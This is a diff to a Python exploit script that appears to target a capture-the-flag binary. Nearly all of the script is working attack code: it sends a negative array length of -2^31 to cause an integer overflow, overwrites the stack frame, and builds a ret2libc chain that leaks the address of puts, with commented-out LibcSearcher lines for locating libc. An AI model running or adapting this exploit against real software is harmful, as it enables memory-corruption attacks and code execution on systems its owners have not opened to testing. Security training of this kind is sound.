@@ -1,41 +1,41 @@
 from helper import *
-abbre(globals(), io, loader) # 此处定义了常用的缩写
 from helper.exp import ret2libc_A, ret2libc_B
 import re
 import ctypes
 from LibcSearcher import *
 
-
 # fill array and ebp
 def fill_array(content):
-    ru(b"choice:\n")
-    sl(b"1")
+    ru("choice:\n")
+    sl(1)
     sl(content)
 
 def from_main():
     # 0x44 + 4 + ret
-    ru(b"length of array:")
-    sl(b"-2147483648")   # -2^31 -> 
+    ru("length of array:")
+    sl("-2147483648")   # -2^31 -> 
 
     for i in range(10):
-        fill_array(bytes(str(0x1111), encoding="utf-8"))
+        fill_array(0x1111)
 
-    fill_array(bytes(str(0x1ead), encoding="utf-8"))
-    fill_array(bytes(str(0x1ead), encoding="utf-8"))
-    fill_array(bytes(str(0xc), encoding="utf-8"))
+    fill_array(0x1ead)
+    fill_array(0x1ead)
+    fill_array(0xc)
     for i in range(5):
-        fill_array(bytes(str(0x2222), encoding="utf-8"))
+        fill_array(0x2222)
 
 
 from_main()
 payload = ret2libc_A("puts", elf.sym['main'], b"")
 
 for bytes32 in re.findall(b"....", payload):
-    sl(b"1"); sl(str(u32(bytes32)))
+    sl(1); sl(u32(bytes32))
 
-sl(b"4")
+sl(4)
 leaked = leak()
 info(hex(leaked))
+io.sendline()
+
 
 # libcs = LibcSearcher("puts", leaked)
 # libcs.select_libc()
